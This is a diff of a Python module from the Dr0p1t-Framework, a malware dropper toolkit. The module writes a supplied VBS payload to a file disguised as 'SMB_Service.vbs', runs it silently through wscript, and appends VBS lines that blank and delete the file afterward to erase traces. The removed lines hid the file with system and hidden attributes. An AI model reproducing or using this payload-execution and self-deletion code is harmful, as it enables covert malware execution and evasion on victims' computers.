+++ resources/Runvbs.py
@@ -1,11 +1,14 @@
 #Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
 #This module aims to run vbs scripts
 #Start
+
 def F522F(tobe):
-    f = open("System_desktop.vbs","w")
-    f.write(tobe)
-    f.close()
-    xxx = subprocess.Popen("attrib +s +h System_desktop.vbs",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
-    blah = subprocess.Popen("wscript System_desktop.vbs > nul",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+	f = open("SMB_Service.vbs","w")
+	f.write(tobe)
+	f.write("\nDim objShell")
+	f.write('\nSet objShell = WScript.CreateObject ("WScript.shell")')
+	f.write('\nobjShell.run "cmd /c break>SMB_Service.vbs && DEL SMB_Service.vbs"')
+	f.close()
+	c = subprocess.Popen("wscript.exe SMB_Service.vbs >> NUL",shell=True)
 
 F522F(Vbs_Script_Data)